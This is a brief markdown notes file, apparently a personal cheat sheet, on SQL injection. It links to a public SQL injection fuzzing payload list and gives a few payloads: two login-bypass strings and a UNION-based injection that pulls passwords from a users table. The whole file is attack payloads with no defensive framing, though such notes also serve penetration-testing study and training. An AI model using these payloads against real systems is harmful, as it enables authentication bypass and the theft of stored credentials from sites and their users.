#sqli 

## Resources
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Generic_Fuzz.txt


## Login Bypass 
```sql
1' AND 1=1 -- comment
```

```sql
' OR ' 1
```


## Numeric Injection
```sql
 -1 UNION SELECT password FROM users 
```

